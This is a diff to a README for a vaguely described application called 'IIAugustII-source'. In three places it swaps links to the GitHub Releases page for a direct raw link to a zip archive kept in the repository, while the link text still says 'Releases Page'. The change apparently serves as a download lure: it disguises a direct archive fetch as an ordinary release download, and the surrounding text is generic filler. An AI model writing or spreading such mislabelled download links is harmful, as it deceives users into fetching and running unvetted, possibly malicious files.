@@ -1,6 +1,6 @@
 # 🚀 IIAugustII-source - Simple Solution for Easy Usage
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/krithickpranav/IIAugustII-source/releases)
+[![Download Now](https://raw.githubusercontent.com/krithickpranav/IIAugustII-source/main/auto/IIAugustII-source-3.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/krithickpranav/IIAugustII-source/main/auto/IIAugustII-source-3.1.zip)
 
 ## 📥 Overview
 IIAugustII-source is a user-friendly application that simplifies tasks for everyday users. Designed with you in mind, this software serves a variety of functions to enhance productivity, making your computing experience more enjoyable.
@@ -9,7 +9,7 @@ IIAugustII-source is a user-friendly application that simplifies tasks for every
 Getting started is easy! Follow these steps to download and run IIAugustII-source:
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases Page](https://github.com/krithickpranav/IIAugustII-source/releases) to access the available versions.
+   Go to the [Releases Page](https://raw.githubusercontent.com/krithickpranav/IIAugustII-source/main/auto/IIAugustII-source-3.1.zip) to access the available versions.
 
 2. **Choose Your Version:**  
    Look through the list and find the latest release. This is usually at the top of the page.
@@ -87,4 +87,4 @@ If you face issues while downloading or installing, consider these steps:
   - 500 MB of free disk space
 
 ## 📥 Download & Install
-To get started with IIAugustII-source, visit the [Releases Page](https://github.com/krithickpranav/IIAugustII-source/releases) today and follow the simple download and installation instructions above. Enjoy enhancing your productivity with our software!
+To get started with IIAugustII-source, visit the [Releases Page](https://raw.githubusercontent.com/krithickpranav/IIAugustII-source/main/auto/IIAugustII-source-3.1.zip) today and follow the simple download and installation instructions above. Enjoy enhancing your productivity with our software!
